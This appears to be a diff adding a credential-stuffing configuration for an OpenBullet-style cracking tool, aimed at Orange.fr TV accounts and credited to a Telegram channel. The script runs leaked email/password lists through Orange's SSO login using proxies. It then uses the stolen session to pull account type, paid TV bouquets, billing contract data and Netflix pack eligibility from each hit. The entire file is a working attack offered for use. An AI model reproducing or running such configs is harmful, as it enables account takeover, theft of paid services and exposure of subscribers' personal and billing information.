@@ -1,0 +1,196 @@
+[SETTINGS]
+{
+  "Name": "OrangeTV",
+  "SuggestedBots": 160,
+  "MaxCPM": 0,
+  "LastModified": "2020-10-10T03:39:10.580144+00:00",
+  "AdditionalInfo": "join @Perfex_Channel for more",
+  "Author": "@Perfex_Channel",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Must Use Orange.fr domain Bases Only",
+      "VariableName": "Base Type",
+      "Id": 1385453801
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#1 FUNCTION Length "<PASS>" -> VAR "1" 
+
+#Pass_restrict KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "<1>" GreaterThan "5" 
+  KEYCHAIN Failure OR 
+    KEY "<1>" LessThan "6" 
+
+#login REQUEST POST "https://sso.orange.fr/WT/userinfo/" 
+  CONTENT "charset=utf_8&wt-pwd=<PASS>&wt-email=<USER>&wt-mco=MCO=OFR&serv=OTVSDK&wt-cvt=4&info=ufn,uln,uit,uid,uip,ulo,msisdn,dsn,mco,lang,cooses,uidpm,ucs,spr,usc,wct,wvd,uem,wrt,aol,tag,pulo,ispr,ise2,sau,lulo&" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: com.orange.TVOrange_iOS_7.10.0_Apple_iPhone8,2_13.0_LL-7.1.1_HL-7.1.1" 
+  HEADER "Host: sso.orange.fr" 
+  HEADER "Accept: */*" 
+  HEADER "Accept-Language: fr-fr" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+#verify_login KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "authentication failed" 
+  KEYCHAIN Success OR 
+    KEY "\"/><ident name=\"" 
+
+#2 PARSE "<SOURCE>" LR "name=\"cooses\" value=\"" "\"" -> VAR "2" 
+
+#user REQUEST GET "https://chaines-tv.orange.fr/live-webapp/v3/applications/PC/users/me" 
+  
+  COOKIE "wassup: <2>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#free_check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "bouquets\":[],\"" 
+
+#account_type PARSE "<SOURCE>" LR "\"accountType\":\"" "\"" -> CAP "Account Type" 
+
+#3 PARSE "<SOURCE>" LR "bouquets\":[\"" "\"]," -> VAR "3" 
+
+#4 FUNCTION Replace "\",\"" ", " "<3>" -> VAR "4" 
+
+#Bouquets FUNCTION Translate StopAfterFirstMatch=FALSE 
+  KEY "PA_BQ_" VALUE "Pack " 
+  KEY "_M" VALUE "Month " 
+  KEY "ACCESTVPREMIUM_M" VALUE "ACCES TV PREMIUM Month " 
+  KEY "BASIC_M" VALUE "Basic Month " 
+  KEY "BASICQUAD_I" VALUE "Basic Quad " 
+  KEY "BASIC_I" VALUE "Basic I " 
+  KEY "PA_" VALUE "Pack " 
+  KEY "beIN_SPORT" VALUE "Bein Sport " 
+  KEY "bouquet_famille_max" VALUE "Bouquet Famille Max " 
+  KEY "PA_pack_" VALUE "Pack " 
+  KEY "cineseries" VALUE "Cine Series" 
+  KEY "pickleTV" VALUE "Pickle Tv " 
+  KEY "bouquet_arabe_max" VALUE "Bouquet Arabe Max " 
+  KEY "bouquet_berbere" VALUE "Bouquet Berbere " 
+  KEY "intense" VALUE "Intense " 
+  KEY "svod_Starz" VALUE "Svod Starz " 
+  KEY "svod_bayam_I" VALUE "Svod Bayam I " 
+  KEY "svod_filmoTV" VALUE "Svod Filmo Tv " 
+  KEY "Sport" VALUE "Sport " 
+  KEY "bouquet_famille_by_canal_nov2018" VALUE "Bouquet Famille By Canal Nov 2018 " 
+  KEY "bouquet_musique_classique" VALUE "Bouquet Musique Classique " 
+  KEY "ACCESTV" VALUE "Acces Tv " 
+  KEY "sgame_prem" VALUE "Sgame Prem " 
+  KEY "bouquet_adulte" VALUE "Bouquet Adulte" 
+  KEY "bouquet_cineseries" VALUE "Bouquet Cine Series " 
+  "<4>" -> CAP "Bouquets" 
+
+#personal_data REQUEST GET "https://sso-f.orange.fr/omoi_erb/account/v1.0/account/users/current/personalDataContracts" 
+  
+  COOKIE "wassup: <2>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Host: sso-f.orange.fr" 
+  HEADER "Origin: https://espace-client.orange.fr" 
+  HEADER "Referer: https://espace-client.orange.fr/contrats-options" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "X-App-Device-Type: desktop" 
+  HEADER "X-Orange-Caller-Id: ECQ" 
+  HEADER "X-Orange-Origin-Id: ECQ" 
+  HEADER "X-Orange-Request-Id: eff396bf-0c0c-4475-bf76-39a8154c0cdd" 
+  HEADER "X-Orange-Session-Id: 025c2066-3d1f-4b4d-871f-4b49192a7a94" 
+
+#free_check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<RESPONSECODE>" Contains "204" 
+
+PARSE "<SOURCE>" LR "cid\":\"" "\",\"" -> VAR "cid" 
+
+#status REQUEST GET "https://sso-f.orange.fr/omoi_erb/facture/v2.0/billsAndPaymentInfos/users/current/contracts/<cid>" 
+  
+  COOKIE "wassup: <2>" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.163 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Host: sso-f.orange.fr" 
+  HEADER "Origin: https://espace-client.orange.fr" 
+  HEADER "Referer: https://espace-client.orange.fr/contrats-options" 
+  HEADER "Sec-Fetch-Dest: empty" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Sec-Fetch-Site: same-site" 
+  HEADER "X-App-Device-Type: desktop" 
+  HEADER "X-Orange-Caller-Id: ECQ" 
+  HEADER "X-Orange-Origin-Id: ECQ" 
+  HEADER "X-Orange-Request-Id: eff396bf-0c0c-4475-bf76-39a8154c0cdd" 
+  HEADER "X-Orange-Session-Id: 025c2066-3d1f-4b4d-871f-4b49192a7a94" 
+
+#open_check KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<RESPONSECODE>" Contains "400" 
+    KEY "<RESPONSECODE>" Contains "503" 
+    KEY "<RESPONSECODE>" Contains "204" 
+
+#Start_Date PARSE "<SOURCE>" LR "date\":\"" "\"" -> CAP "Start Date" 
+
+#Netflix REQUEST GET "https://m.boutique.orange.fr/tv/pack-ocsnetflix" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#netflix_check KEYCHECK 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Ce bouquet n’est pas disponible avec votre offre actuelle" 
+    KEY "Vous détenez déjà cette option." 
+    KEY "0€ /mois" 
+  KEYCHAIN Success OR 
+    KEY "pendant 2 mois puis 23,99€ Sans engagement " 
+    KEY "pendant 2 mois puis 19,99€. Sans engagement" 
+
+#Credit FUNCTION Constant "@Perfex_Channel" -> CAP "JOIN FOR MORE" 
+
